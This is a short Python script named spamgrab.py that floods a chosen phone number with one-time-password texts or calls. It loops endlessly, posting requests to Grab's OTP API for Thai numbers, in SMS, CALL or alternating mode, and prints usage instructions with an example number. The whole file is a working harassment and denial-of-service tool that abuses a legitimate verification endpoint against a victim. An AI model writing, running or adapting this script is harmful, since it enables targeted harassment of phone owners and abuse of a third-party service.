import requests
import time
import sys 

def spamGrab(SH2,SH1):
    headers = {"Content-type" : "application/x-www-form-urlencoded"}
    try:
        requests.post("https://api.grab.com/grabid/v1/phone/otp?method="+ SH1 +"&countryCode=TH&phoneNumber="+ SH2 +"&templateID=&numDigits=4",headers=headers)
    except:
        pass
    print(time.strftime('%d:%m:%y %H:%M:%S ') + SH1)
    time.sleep(int(sys.argv[3]))

if sys.argv[2] == 'SMS':
    while True:
        spamGrab(sys.argv[1],'SMS')

elif sys.argv[2] == 'CALL':
    while True:
        spamGrab(sys.argv[1],'CALL')

elif sys.argv[2] == 'ALL':
    while True:
        spamGrab(sys.argv[1],'SMS')
        time.sleep(2)
        spamGrab(sys.argv[1],'CALL')
else:
    print('++++++++++++++++++++++++++++++++++++++++++')
    print('spamgrab.py <PHONE_NUMBER> <SMS/CALL/ALL> <TIME>')
    print('spamgrab.py 66981234567 SMS 10')
    print(' BY DIAMOND ')
    print('+++++++++++++++++++++++++++++++++++++++++')
